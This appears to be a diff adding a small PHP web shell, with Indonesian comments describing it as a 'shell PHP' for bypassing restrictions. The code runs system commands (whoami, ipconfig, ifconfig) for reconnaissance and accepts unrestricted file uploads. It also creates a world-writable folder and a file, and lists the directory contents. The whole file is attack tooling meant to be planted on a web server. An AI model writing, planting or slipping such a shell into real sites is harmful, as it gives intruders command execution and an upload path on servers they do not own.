@@ -1,0 +1,54 @@
+<?php
+// Bypass PHP (menggunakan system())
+system("whoami"); // Menampilkan user yang sedang login
+system("ipconfig"); // Menampilkan informasi IP (Windows)
+system("ifconfig"); // Menampilkan informasi IP (Linux)
+
+// Upload file
+$target = "upload/".basename($_FILES['file']['name']);
+if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+    echo "File berhasil diupload: " . htmlspecialchars($target) . "
+";
+} else {
+    echo "Gagal mengupload file.
+";
+}
+
+// Membuat folder
+$folder = "folder_baru/";
+if (mkdir($folder, 0777, true)) {
+    echo "Folder berhasil dibuat: " . htmlspecialchars($folder) . "
+";
+} else {
+    echo "Gagal membuat folder.
+";
+}
+
+// Membuat file
+$file = "file_baru.txt";
+$content = "Ini adalah isi file yang dibuat oleh shell PHP.";
+if (file_put_contents($file, $content)) {
+    echo "File berhasil dibuat: " . htmlspecialchars($file) . "
+";
+} else {
+    echo "Gagal membuat file.
+";
+}
+
+// Akses file dan folder
+echo "<h3>Akses File:</h3>";
+$files = scandir(".");
+foreach ($files as $file) {
+    if ($file != "." && $file != "..") {
+        echo " - " . htmlspecialchars($file) . "
+";
+    }
+}
+
+echo "<h3>Akses Folder:</h3>";
+$folders = array_diff(scandir("."), array(".", ".."));
+foreach ($folders as $folder) {
+    echo " - " . htmlspecialchars($folder) . "
+";
+}
+?>
